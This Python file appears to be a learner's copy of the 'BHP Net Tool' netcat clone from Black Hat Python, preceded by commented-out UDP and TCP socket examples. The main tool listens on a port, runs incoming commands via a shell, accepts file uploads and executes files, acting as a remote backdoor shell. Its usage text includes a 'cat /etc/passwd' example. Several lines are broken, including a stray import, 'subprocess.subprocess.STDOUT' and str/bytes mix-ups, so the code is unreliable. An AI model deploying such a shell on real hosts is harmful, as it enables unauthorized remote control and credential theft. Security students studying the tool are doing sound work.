#______________________________________________________________________________

# # A simple UDP Client

# target_host = '127.0.0.1'
# target_port = 80

# client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
# client.sendto(b'boom and superboom',(target_host,target_port))
# data,addrr = client.recvfrom(4096)
# print(f'data {data} from {addrr}')

#____________________________________________________________________________________

# A simple TCP SERVER
# import socket 
# import threading

# bind_ip = '0.0.0.0'
# bind_port = 9999

# server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# server.bind((bind_ip,bind_port))
# server.listen(5)

# print('[*] Listening on %s:%d' %(bind_ip,bind_port))

# # client handling thread
# def handle_client(client_socket):
#     request = client_socket.recv(1024)
    
#     print('[*] Received: %s ' % request)

#     # send back a packet
#     client_socket.send(b'ACK! ')

#     client_socket.close()

# while True:
#     client,addr = server.accept()

#     print('[*] Accepted connection from %s %d' % (addr[0],addr[1]))
    
#     # spin up our client thread to handle incoming data
#     client_handler = threading.Thread(target=handle_client,args=(client,))
#     client_handler.start()

#_________________________________________________________________________________

from os import CLD_EXITED
import sys
import socket
import getopt
import threading
import subprocess

# define some global variable
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():
    print('BHP Net Tool')
    print()
    print('Usage: bhpnet.py -t target_host -p port')
    print('-l --listen               - listen on [host]:[port] for incoming connections')
    print('-e --execute=file_to_run  - execute the given file upon receiving the connection')
    print('-c --command              - initialize a command shell')
    print('-u --upload=destination   - upon receiving connection upload a file and write to [ destination ]')
    print(end='\n\n')
    print('Examples: ')
    print('bhpnet.py 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd\'')
    print('echo "ABCDEFGHI" | ./bhpnet.py -t 192.168.11.12 -p 135 ')
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target,port))

        if len(buffer):
            buffer = bytes(buffer,'utf-8')
            client.send(buffer)
        
        while True:

            # now wait for the data back
            recv_len = 1
            response =''

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response += str(data)

                if recv_len < 4096:
                    break
            
            print(response)

            # wait for input
            buffer = input('')
            buffer += '\n'
            buffer = bytes(buffer,'utf-8')
            # send it off
            client.send(buffer)

    except Exception as err:
        print('[*] Exception! Exiting.')
        print(err)
        # tear down the connection
        client.close()

def server_loop():
    global target

    # if target is not defined, we listen on all interfaces
    if not len(target):
        target = '0.0.0.0'
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):

    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.subprocess.STDOUT, shell=True)

    except:
        output = "Failed to execute command.\r\n"

    # send the output back to the client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    if len(upload_destination):
        
        # read in all of the bytes and write to our destination 
        file_buffer = ''

        # keep reading data until none is available

        while True:
            data = client_socket.recv(1024)
            data = data.decode('utf-8')

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out 
        try:
            file_descriptor = open(upload_destination,'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out 
            client_socket.send(b"Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send(b'Failed to save the file to %s\r\n' % upload_destination)

    # check for command execution
    if len(execute):

        # run the command
        output = run_command(execute)
        client_socket.send(output)
    if command:
        while True:
            # show a simple prompt
            client_socket.send(b'<BHP:#> ')

            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += str(client_socket.recv(1024))

            # send back the command output 
            response = run_command(cmd_buffer)
            response = bytes(response,'utf-8')

            # send back the response
            client_socket.send(response)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandLine options
    try:
        opts,args = getopt.getopt(sys.argv[1:],'hle:t:p:cu:',
                    ['help','listen','execute','target','port','command','upload'])
    
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ('-h','--help'):
            usage()
        elif o in ('-l','--listen'):
            listen = True
        elif o in ('-e','--execute'):
            execute = a
        elif o in ('-c','--commandshell'):
            command = True
        elif o in ('-u','--upload'):
            upload_destination = a 
        elif o in ('-t','--target'):
            target = a
        elif o in ('-p','--port'):
            port = int(a)
        else:
            assert False,'Unhandled Option'

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:

        # read in the buffer from the commandline
        # this will block, so send CTRL_D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)
    
    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back
    if listen:
        server_loop()

main()
    

